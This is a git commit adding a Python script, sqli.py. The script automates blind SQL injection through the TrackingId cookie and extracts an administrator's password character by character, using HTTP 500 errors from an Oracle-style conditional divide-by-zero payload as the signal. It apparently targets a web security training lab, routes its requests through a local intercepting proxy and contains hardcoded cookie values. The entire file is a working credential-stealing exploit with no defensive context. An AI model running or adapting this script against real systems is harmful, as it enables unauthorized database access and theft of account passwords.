7ac228531428eb5755a7495b53add12061dc2f7e
d3ndr1t30x <117501042+d3ndr1t30x@users.noreply.github.com>
2024-06-17 12:01:03 +1000

    Add files via upload

---
+++ sqli.py
@@ -0,0 +1,39 @@
+import sys
+import requests
+import urllib3
+import urllib.parse
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def sqli_password(url):
+    password_extracted = ""
+    for i in range(1,21):
+        for j in range(32,126):
+            sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
+            sqli_payload_encode = urllib.parse.quote(sqli_payload)
+            cookies = {'TrackingId': 'Y4FYVjo3U13O8bgR' + sqli_payload_encode, 'session': 'aE2b3VlLRZZ6ouE42cn88hTYownnZ72U'}
+            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
+            if r.status_code == 500:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    url = sys.argv[1]
+    print("(+) Retreiving administrator password...")
+    sqli_password(url)
+
+if __name__=="__main__":
+    main()
+
+      
